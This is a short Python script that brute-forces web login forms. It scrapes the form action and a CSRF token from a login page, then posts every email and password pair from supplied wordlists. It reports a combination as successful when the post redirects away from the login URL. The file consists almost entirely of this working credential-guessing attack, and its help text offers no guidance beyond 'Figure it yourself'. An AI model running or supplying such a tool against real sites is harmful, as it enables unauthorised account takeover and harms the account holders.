from getopt import getopt
import sys
from bs4 import BeautifulSoup
import requests
from threading import Thread, Event, current_thread

URL = ''
URI = ''
PORT = 80
THREAD = 10
USERNAME = None
PASSWORD = None
session = requests.session()


def info():
    print("Help info here...")
    print("Figure it yourself")

def brute(action, token):
    target = URL + '/' + action
    # print(target, URL + '/' + URI, token)
    for i in range(len(USERNAME)):
        email = USERNAME[i].rstrip()
        for password in PASSWORD:
            password = password.rstrip()
            data={
                'email' : email,
                'password' : password,
                'token' : token
            }
            resp = session.post(target, data=data)

            if not URL + '/' + URI == resp.url:
                print("Combination between %s and %s success"%(email, password))
                return


def main():
    global URL, PORT, THREAD, USERNAME, PASSWORD, URI
    try:
        args, _ = getopt(sys.argv[1:],"u:i:he:p:",["url=",'uri=',"help","email=",'password='])
        for key, value in args:
            if key in ['-h','--help']:
                exit(info())
            elif key in ['-u','--url']:
                URL = value
            elif key in ['-i','--uri']:
                URI = value
            elif key in ['-e','--email']:
                USERNAME = open(value, "r").readlines()
            elif key in ['-p','--password']:
                PASSWORD = open(value, "r").readlines()
    except Exception:
        exit(info())

    resp = session.get(URL + '/' + URI)
    if resp.status_code == 404:
        exit(print("[!] Invalid URL"))

    soup = BeautifulSoup(resp.text,'html.parser')

    form = soup.find("form")

    action = form['action']

    csrf_value = soup.find("input",attrs={'name': "token"}).get('value')

    brute(action, csrf_value)

if __name__ == "__main__":
    main()